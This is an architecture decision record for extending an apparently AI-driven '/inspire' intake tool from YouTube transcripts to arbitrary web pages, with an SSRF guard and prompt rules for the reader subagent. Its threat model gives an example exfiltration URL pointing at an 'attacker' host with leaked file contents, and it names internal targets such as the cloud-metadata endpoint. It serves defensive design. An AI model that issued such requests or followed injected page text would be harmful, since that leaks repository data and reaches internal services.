# 0003 — Support arbitrary web pages; accept a soft egress guarantee, SSRF-guarded

- **Status:** Accepted
- **Date:** 2026-06-02

## Context

`/inspire` originally took only YouTube URLs. We extended it to any web article
(e.g. an engineering blog post). The intake pipeline downstream of fetching is
already source-agnostic, so the only new pieces are *content extraction* and
*routing*. Extraction raised a security question the YouTube path didn't have.

The YouTube transcript tool accepts only a video id, so it can reach **only**
YouTube — a *hard* no-egress guarantee. A general web fetcher takes an **arbitrary
URL**. Paired with the reader's repo-read access, an arbitrary-URL fetch is itself
a (low-bandwidth, GET-only) exfiltration channel: an injection could try to steer
the reader into fetching `https://attacker/?leak=<file contents>`, or into hitting
internal services (`169.254.169.254`, RFC1918 hosts) the reader shouldn't reach.

## Decision

- **Extract with `trafilatura`** (Apache-2.0, pinned `>=1.8,<3`) behind our own
  MCP tool `get_webpage_content`, mirroring the transcript tool's hardening
  (control-char strip, length cap, data-not-instructions header). We fetch the
  bytes ourselves and hand the HTML to `trafilatura.extract` — we do **not** use
  its built-in downloader, so we keep control of the request (below).
- **Keep two subagents, not one.** `inspire-reader` (web) is separate from
  `inspire-watcher` (YouTube) specifically so the watcher's tool stays
  YouTube-only — the broader fetch capability is isolated to the non-YouTube path
  (least privilege, per [0002](0002-untrusted-content-isolation.md)).
- **SSRF-guard the fetcher.** `http(s)` only; every host — initial request *and*
  every redirect hop — must resolve to a public IP (loopback, link-local, private,
  reserved, multicast, and the cloud-metadata endpoint are refused).
- **Carry the rest in the prompt.** The reader is instructed to fetch *only the one
  URL it was handed* and to report (never obey) any page text urging another fetch.
- **Be honest that this is a *soft* guarantee.** Unlike the YouTube path, it can't
  be made airtight; we document the residual risk rather than implying parity.

## Consequences

- New capability (web articles) with the exfiltration surface meaningfully narrowed
  but not eliminated. Documented as soft-vs-hard in the README and tech docs.
- `trafilatura` reads **static HTML only** — paywalled, login-walled, or
  JavaScript-rendered pages, and non-HTML (PDFs), fail gracefully with an `ERROR:`
  line. A headless browser was rejected: heavy dependency and an execution surface
  we don't want near untrusted content.
- DNS-rebinding (resolve-then-reconnect TOCTOU) is **not** defended — out of scope
  for a prompt-injection threat model; noted so a future reader knows it's a choice.
- A configurable *domain* policy on top of the IP guard is added separately in
  [0005](0005-operational-hooks.md).
